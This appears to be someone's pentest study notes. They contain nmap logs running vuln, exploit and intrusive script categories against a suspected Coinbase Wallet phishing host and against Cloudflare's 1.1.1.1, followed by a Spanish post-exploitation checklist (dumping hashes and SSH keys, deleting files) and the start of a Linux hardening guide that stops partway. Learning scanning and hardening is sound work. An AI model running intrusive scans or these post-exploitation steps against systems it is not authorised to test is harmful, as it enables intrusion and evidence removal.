     ⭐  ~  ok  took 22s  at 18:39:24 >
     
     > nmap -script malware  --webxml -oA nmap-156.242.11.17-malware 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:54 CEST
    Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 78.90% done; ETC: 18:54 (0:00:03 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 20.09 seconds

     ⭐  ~  ok  took 20s  at 18:54:41 > 
    > nmap -script safe  --webxml -oA nmap-156.242.11.17-safe 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:55 CEST
    Stats: 0:00:15 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 96.83% done; ETC: 18:55 (0:00:01 remaining)
    Stats: 0:00:32 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 98.41% done; ETC: 18:56 (0:00:01 remaining)
    Pre-scan script results:
    |_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    |_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    | targets-asn: 
    |_  targets-asn.asn is a mandatory parameter
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-referer-checker: Couldn't find any cross-domain scripts.
    |_http-date: Fri, 19 Aug 2022 16:56:49 GMT; -3s from local time.
    |_http-mobileversion-checker: No mobile version detected.
    | http-vuln-cve2011-3192: 
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |       https://www.securityfocus.com/bid/49303
    |_      https://www.tenable.com/plugins/nessus/55976
    |_http-xssed: No previously reported XSS vuln.
    |_http-fetch: Please enter the complete path of the directory to save data in.
    | http-security-headers: 
    |   Cache_Control: 
    |_    Header: Cache-Control: no-cache
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | http-headers: 
    |   Server: nginx
    |   Date: Fri, 19 Aug 2022 16:56:46 GMT
    |   Content-Type: text/html; charset=utf-8
    |   Content-Length: 712
    |   Last-Modified: Mon, 25 Apr 2022 03:00:07 GMT
    |   Connection: close
    |   ETag: "62660eb7-2c8"
    |   Cache-Control: no-cache
    |   Accept-Ranges: bytes
    |   
    |_  (Request type: HEAD)
    | http-useragent-tester: 
    |   Status for browser useragent: 200
    |   Allowed User Agents: 
    |     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
    |     libwww
    |     lwp-trivial
    |     libcurl-agent/1.0
    |     PHP/
    |     Python-urllib/2.5
    |     GT::WWW
    |     Snoopy
    |     MFC_Tear_Sample
    |     HTTP::Lite
    |     PHPCrawl
    |     URI::Fetch
    |     Zend_Http_Client
    |     http client
    |     PECL::HTTP
    |     Wget/1.13.4 (linux-gnu)
    |_    WWW-Mechanize/1.34
    | http-comments-displayer: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=156.242.11.17
    |     
    |     Path: http://156.242.11.17:80/
    |     Line number: 4
    |     Comment: 
    |         <!-- <meta property="og:site_name" content="CB-W">
    |             <meta property="og:title" content="Coinbase Wallet">
    |             <meta property="og:image" content="machine/og_img.png">
    |             <meta property="og:url" content="machine/share.html">
    |             <meta property="og:type" content="website" />
    |             <meta property="og:updated_time" content="1637723687" /> -->
    |     
    |     Path: http://156.242.11.17:80/
    |     Line number: 3
    |     Comment: 
    |         <!-- og meta -->
    |     
    |     Path: http://156.242.11.17:80/
    |     Line number: 10
    |     Comment: 
    |         <!-- twitter -->
    |     
    |     Path: http://156.242.11.17:80/
    |     Line number: 11
    |     Comment: 
    |         <!-- <meta name="twitter:site" content="CB-W" />
    |             <meta name="twitter:title" content="Coinbase Wallet ">
    |             <meta name="twitter:image" content="machine/og_img.png">
    |_            <meta name="twitter:card" content="summary_large_image" /> -->
    443/tcp open   https
    | http-useragent-tester: 
    |   Status for browser useragent: 200
    |   Allowed User Agents: 
    |     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
    |     libwww
    |     lwp-trivial
    |     libcurl-agent/1.0
    |     PHP/
    |     Python-urllib/2.5
    |     GT::WWW
    |     Snoopy
    |     MFC_Tear_Sample
    |     HTTP::Lite
    |     PHPCrawl
    |     URI::Fetch
    |     Zend_Http_Client
    |     http client
    |     PECL::HTTP
    |     Wget/1.13.4 (linux-gnu)
    |_    WWW-Mechanize/1.34
    | http-security-headers: 
    |   Strict_Transport_Security: 
    |     HSTS not configured in HTTPS Server
    |   Cache_Control: 
    |_    Header: Cache-Control: no-cache
    |_http-mobileversion-checker: No mobile version detected.
    | http-headers: 
    |   Server: nginx
    |   Date: Fri, 19 Aug 2022 16:56:49 GMT
    |   Content-Type: text/html; charset=utf-8
    |   Content-Length: 712
    |   Last-Modified: Mon, 25 Apr 2022 03:00:07 GMT
    |   Connection: close
    |   ETag: "62660eb7-2c8"
    |   Cache-Control: no-cache
    |   Accept-Ranges: bytes
    |   
    |_  (Request type: HEAD)
    |_ssl-date: TLS randomness does not represent time
    |_http-referer-checker: Couldn't find any cross-domain scripts.
    | tls-nextprotoneg: 
    |_  http/1.1
    |_http-date: Fri, 19 Aug 2022 16:56:44 GMT; 0s from local time.
    |_http-xssed: No previously reported XSS vuln.
    | http-comments-displayer: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=156.242.11.17
    |     
    |     Path: https://156.242.11.17:443/
    |     Line number: 4
    |     Comment: 
    |         <!-- <meta property="og:site_name" content="CB-W">
    |             <meta property="og:title" content="Coinbase Wallet">
    |             <meta property="og:image" content="machine/og_img.png">
    |             <meta property="og:url" content="machine/share.html">
    |             <meta property="og:type" content="website" />
    |             <meta property="og:updated_time" content="1637723687" /> -->
    |     
    |     Path: https://156.242.11.17:443/
    |     Line number: 3
    |     Comment: 
    |         <!-- og meta -->
    |     
    |     Path: https://156.242.11.17:443/
    |     Line number: 10
    |     Comment: 
    |         <!-- twitter -->
    |     
    |     Path: https://156.242.11.17:443/
    |     Line number: 11
    |     Comment: 
    |         <!-- <meta name="twitter:site" content="CB-W" />
    |             <meta name="twitter:title" content="Coinbase Wallet ">
    |             <meta name="twitter:image" content="machine/og_img.png">
    |_            <meta name="twitter:card" content="summary_large_image" /> -->
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    |_http-fetch: Please enter the complete path of the directory to save data in.
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | tls-alpn: 
    |_  http/1.1

    Host script results:
    |_tor-consensus-checker: 156.242.11.17 not found in Tor consensus
    | port-states: 
    |   tcp: 
    |     open: 80,443
    |     filtered: 1,3-4,6-7,9,13,17,19-21,23-26,30,32-33,37,42-43,49,53,70,79,81-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,444-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389
    |_    closed: 22
    | dns-blacklist: 
    |   SPAM
    |     bl.spamcop.net - FAIL
    |     dnsbl.inps.de - FAIL
    |     l2.apews.org - FAIL
    |     sbl.spamhaus.org - FAIL
    |     spam.dnsbl.sorbs.net - FAIL
    |     bl.nszones.com - FAIL
    |     list.quorum.to - FAIL
    |     all.spamrats.com - FAIL
    |   ATTACK
    |     all.bl.blocklist.de - FAIL
    |   PROXY
    |_    socks.dnsbl.sorbs.net - FAIL
    | unusual-port: 
    |_  WARNING: this script depends on Nmap's service/version detection (-sV)
    |_clock-skew: mean: -1s, deviation: 2s, median: -3s
    | whois-ip: Record found at whois.afrinic.net
    | inetnum: 156.242.11.0 - 156.242.11.255
    | netname: HongKong_MEGALAYER_Technology
    | descr: HongKong MEGALAYER Technology
    |_country: US
    |_fcrdns: FAIL (No PTR record)
    |_asn-query: No Answers
    |_whois-domain: You should provide a domain name.
    | ip-geolocation-geoplugin: coordinates: 34.0544, -118.244
    |_location: California, United States

    Post-scan script results:
    Bug in ip-geolocation-map-bing: no string output.
    | reverse-index: 
    |   80/tcp: 156.242.11.17
    |_  443/tcp: 156.242.11.17
    Bug in ip-geolocation-map-google: no string output.
    Bug in ip-geolocation-map-kml: no string output.
    Nmap done: 1 IP address (1 host up) scanned in 140.46 seconds

    ⭐  ~  ok  took 2m 21s  at 18:57:51 >    


     > nmap -script auth  --webxml -oA nmap-156.242.11.17-auth 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:40 CEST
    Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 0.65% done
    Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 58.50% done; ETC: 18:40 (0:00:06 remaining)
    Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 78.79% done; ETC: 18:40 (0:00:00 remaining)
    Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 98.48% done; ETC: 18:40 (0:00:00 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-config-backup: ERROR: Script execution failed (use -d to debug)
    443/tcp open   https
    |_http-config-backup: ERROR: Script execution failed (use -d to debug)

    Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds

     ⭐  ~  ok  took 20s  at 18:40:36 >  
    
    > nmap -script broadcast  --webxml -oA nmap-156.242.11.17-broadcast 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:41 CEST
    Stats: 0:00:29 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 98.08% done; ETC: 18:42 (0:00:01 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 52.34 seconds

     ⭐  ~  ok  took 52s  at 18:42:39 >     
     
    > nmap -script vuln  --webxml -oA nmap-156.242.11.17-vuln 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 19:09 CEST
    Stats: 0:09:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.53% done; ETC: 19:18 (0:00:02 remaining)
    Stats: 0:10:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.53% done; ETC: 19:20 (0:00:03 remaining)
    Stats: 0:11:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.53% done; ETC: 19:21 (0:00:03 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    | http-vuln-cve2011-3192: 
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |       https://www.tenable.com/plugins/nessus/55976
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |_      https://www.securityfocus.com/bid/49303
    | http-enum: 
    |   /0/: Potentially interesting folder
    |_  /index/: Potentially interesting folder
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    443/tcp open   https
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /0/: Potentially interesting folder
    |_  /index/: Potentially interesting folder
    | http-vuln-cve2011-3192: 
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |       https://www.tenable.com/plugins/nessus/55976
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |_      https://www.securityfocus.com/bid/49303
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

    Nmap done: 1 IP address (1 host up) scanned in 931.36 seconds

     ⭐  ~  ok  took 15m 31s  at 19:25:06 >               

    > nmap -script exploit  --webxml -oA nmap-156.242.11.17-exploit 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:44 CEST
    Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 95.74% done; ETC: 18:44 (0:00:00 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.19s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    443/tcp open   https
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.

    Nmap done: 1 IP address (1 host up) scanned in 22.40 seconds

     ⭐  ~  ok  took 22s  at 18:44:23 > 

    > nmap -script external  --webxml -oA nmap-156.242.11.17-external 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:45 CEST
    Pre-scan script results:
    |_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    | targets-asn: 
    |_  targets-asn.asn is a mandatory parameter
    |_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 65.79% done; ETC: 18:46 (0:00:23 remaining)
    Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 92.31% done; ETC: 18:46 (0:00:06 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-xssed: No previously reported XSS vuln.
    443/tcp open   https
    |_http-xssed: No previously reported XSS vuln.

    Host script results:
    | dns-blacklist: 
    |   SPAM
    |     dnsbl.inps.de - FAIL
    |     l2.apews.org - FAIL
    |_    list.quorum.to - FAIL
    |_asn-query: No Answers
    |_tor-consensus-checker: 156.242.11.17 not found in Tor consensus
    Bug in ip-geolocation-geoplugin: no string output.
    |_whois-domain: You should provide a domain name.
    | whois-ip: Record found at whois.afrinic.net
    | inetnum: 156.242.11.0 - 156.242.11.255
    | netname: HongKong_MEGALAYER_Technology
    | descr: HongKong MEGALAYER Technology
    |_country: US

    Nmap done: 1 IP address (1 host up) scanned in 91.68 seconds

     ⭐  ~  ok  took 1m 32s  at 18:46:56 >   
    
    > nmap -script intrusive  --webxml -oA nmap-156.242.11.17-intrusive 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:49 CEST
    Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 18.81% done; ETC: 18:49 (0:00:22 remaining)
    Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 19.24% done; ETC: 18:53 (0:03:13 remaining)
    Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 19.24% done; ETC: 18:58 (0:07:29 remaining)
    Stats: 0:03:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 19.24% done; ETC: 19:08 (0:15:07 remaining)
    ...

    > nmap -script fuzzer  --webxml -oA nmap-156.242.11.17-fuzzer 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:48 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds

     ⭐  ~  ok  took 13s  at 18:48:17 >  


    > nmap -sV  -A --webxml -oA nmap-156.242.11.17 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:20 CEST
    Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 52.80% done; ETC: 18:20 (0:00:08 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE  VERSION
    22/tcp  closed ssh
    80/tcp  open   http     nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    443/tcp open   ssl/http nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-nextprotoneg: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 35.47 seconds
    > ls nmap-156.242.11.17.*
    nmap-156.242.11.17.gnmap  nmap-156.242.11.17.nmap  nmap-156.242.11.17.xml
    
    # you can run two or more categories...
    
    (base) [sáb 22/08/20 13:09 CEST][s000][x86_64/darwin21.0/21.6.0][5.8.1]
    <aironman@MacBook-Pro-de-Alonso:~>
    zsh 6590 [255] % nmap -script default,vuln -oA nmap-1.1.1.1 1.1.1.1 
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 13:10 CEST
    Stats: 0:00:26 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 92.31% done; ETC: 13:10 (0:00:02 remaining)
    Pre-scan script results:
    | broadcast-avahi-dos: 
    |   Discovered hosts:
    |     224.0.0.251
    |   After NULL UDP avahi packet DoS (CVE-2011-1002).
    |_  Hosts are all up (not vulnerable).
    Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.21% done; ETC: 13:12 (0:00:00 remaining)
    Stats: 0:02:54 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.36% done; ETC: 13:13 (0:00:01 remaining)
    Stats: 0:03:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.68% done; ETC: 13:13 (0:00:00 remaining)
    Stats: 0:10:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:20 (0:00:01 remaining)
    Stats: 0:15:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:25 (0:00:01 remaining)
    Stats: 0:16:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:26 (0:00:01 remaining)
    Stats: 0:16:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:26 (0:00:01 remaining)
    Stats: 0:16:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:26 (0:00:01 remaining)
    Stats: 0:19:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:29 (0:00:02 remaining)
    Stats: 0:19:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:29 (0:00:02 remaining)
    Nmap scan report for one.one.one.one (1.1.1.1)
    Host is up (0.020s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE SERVICE
    53/tcp  open  domain
    | dns-nsid: 
    |   NSID: 40m68 (34306d3638)
    |_  id.server: MAD
    80/tcp  open  http
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-title: Did not follow redirect to https://one.one.one.one/
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug)
    |_http-passwd: ERROR: Script execution failed (use -d to debug)
    443/tcp open  https
    | http-fileupload-exploiter: 
    |   
    |_    Couldn't find a file-type field.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Site doesn't have a title (application/xml).
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    | ssl-cert: Subject: commonName=cloudflare-dns.com/organizationName=Cloudflare, Inc./stateOrProvinceName=California/countryName=US
    | Subject Alternative Name: DNS:cloudflare-dns.com, DNS:*.cloudflare-dns.com, DNS:one.one.one.one, IP Address:1.1.1.1, IP Address:1.0.0.1, IP Address:162.159.36.1, IP Address:162.159.46.1, IP Address:2606:4700:4700:0:0:0:0:1111, IP Address:2606:4700:4700:0:0:0:0:1001, IP Address:2606:4700:4700:0:0:0:0:64, IP Address:2606:4700:4700:0:0:0:0:6400
    | Not valid before: 2021-10-25T00:00:00
    |_Not valid after:  2022-10-25T23:59:59
    | http-vuln-cve2010-0738: 
    |_  /jmx-console/: Authentication was not required
    | http-enum: 
    |   /beta/: Potentially interesting folder
    |   /es/: Potentially interesting folder
    |   /help/: Potentially interesting folder
    |_  /nl/: Potentially interesting folder
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)

    Nmap done: 1 IP address (1 host up) scanned in 1182.22 seconds

    # As you can see, nmap has created three files...
    
    <aironman@MacBook-Pro-de-Alonso:~>
    zsh 6591 % ls nmap-*                                         
    Executing ls -G
    nmap-1.1.1.1.gnmap nmap-1.1.1.1.nmap  nmap-1.1.1.1.xml

    # MSF Aux Modules
    
        working in a POC with Loi
        
        https://www.youtube.com/watch?v=K7y_-JtpZ7I
        
    EXPLOTACIÓN
    Recolección versiones del software
    Searchsploit
    Credenciales por defecto
    Uso de credenciales obtenidos
    Descarga de software

    # POST EXPLOTACIÓN

        https://highon.coffee/blog/linux-commands-cheat-sheet/
    
    LINUX
        
        http://linux-local-enum.sh
    
    http://inuxprivchecker.py
    http://linux-exploit-suggestor.sh
    http://unix-privesc-check.py

    WINDOWS
    wpc.exe
    http://windows-exploit-suggestor.py
    windows_privesc_check.py
    windows-privesc-check2.exe

    ESCALADA DE PRIVILEGIOS
    Acceso a servicios internos (portfwd)
    Añadir una cuenta

    WINDOWS
    Lista de exploits

    LINUX
    Sudo su 
    KernelDB
    Searchsploit

    FINALIZACIÓN
    Capturas de pantalla IPConfig\WhoamI
    Dump hashes 
    Dump SSH Keys
    Borrado de archivos
    Documentación final.
    
#   GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

    The project collects legitimate functions of Unix binaries that can be abused to get the f**k break out restricted shells, 
    escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

    https://gtfobins.github.io
    
# Another hacking Cheatsheet

    git clone https://github.com/Tib3rius/Pentest-Cheatsheets
    sudo make clean 
    sudo make html
    firefox file:///home/kali/git/Pentest-Cheatsheets/_build/html/index.html
    
    List of commands and techniques to while conducting any kind of hacking :)

    # "The quieter you become, The more you’re able to hear"

# Basic hardening linux server, debian based

    https://www.youtube.com/watch?v=ZhMw53Ud2tY
    
    STEP 1 - Enable Automatic Updates

    Manual Updates:

    apt update
    apt dist-upgrade

    Automatic Updates:

    apt install unattended-upgrades
    dpkg-reconfigure --priority=low unattended-upgrades


    STEP 2 - Create a Limited User Account

    Create a User:

    adduser {username}


    Add user to the sudo group:

    usermod -aG sudo {username}


    STEP 3 - Passwords are for SUCKERS!

    Create the Public Key Directory on your Linux Server

    mkdir ~/.ssh && chmod 700 ~/.ssh


    Create Public/Private keys on your computer

    ssh-keygen -b 4096


    Upload your Public key to the your Linux Server (Windows)

